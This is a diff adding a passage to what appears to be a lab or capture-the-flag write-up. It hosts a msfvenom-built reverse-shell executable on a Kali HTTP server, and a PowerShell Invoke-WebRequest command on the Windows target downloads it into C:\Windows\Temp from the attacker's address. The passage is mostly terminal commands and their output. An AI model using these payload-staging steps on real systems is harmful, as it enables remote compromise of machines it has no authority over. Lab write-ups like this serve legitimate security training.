@@ -82,3 +82,46 @@ Payload size: 381 bytes
 Final size of exe file: 73802 bytes
 Saved as: reverse.exe
 ```
+
+```
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+```
+┌──(kali㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.112.140.135 - - [17/Jul/2026 06:10:14] "GET /reverse.exe HTTP/1.1" 200 -
+````
+
+```
+c:\Windows\Temp>powershell -c "Invoke-WebRequest -Uri 'http://192.168.170.150:8000/reverse.exe' -OutFile 'C:\Windows\Temp\reverse.exe'"
+
+c:\Windows\Temp>
+dir
+c:\Windows\Temp>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 0E97-C552
+ Directory of c:\Windows\Temp
+07/17/2026  03:10 AM    <DIR>          .
+07/17/2026  03:10 AM    <DIR>          ..
+08/06/2019  02:13 PM             8,795 Amazon_SSM_Agent_20190806141239.log
+08/06/2019  02:13 PM           181,468 Amazon_SSM_Agent_20190806141239_000_AmazonSSMAgentMSI.log
+08/06/2019  02:13 PM             1,206 cleanup.txt
+08/06/2019  02:13 PM               421 cmdout
+08/06/2019  02:11 PM                 0 DMI2EBC.tmp
+08/03/2019  10:43 AM                 0 DMI4D21.tmp
+08/06/2019  02:12 PM             8,743 EC2ConfigService_20190806141221.log
+08/06/2019  02:12 PM           292,438 EC2ConfigService_20190806141221_000_WiXEC2ConfigSetup_64.log
+07/17/2026  02:22 AM    <DIR>          EC2Launch017155043
+07/17/2026  02:42 AM    <DIR>          Microsoft
+07/17/2026  03:10 AM            73,802 reverse.exe
+08/06/2019  02:13 PM                21 stage1-complete.txt
+08/06/2019  02:13 PM            28,495 stage1.txt
+05/12/2019  09:03 PM           113,328 svcexec.exe
+08/06/2019  02:13 PM                67 tmp.dat
+              13 File(s)        708,784 bytes
+               4 Dir(s)  38,984,822,784 bytes free
+```
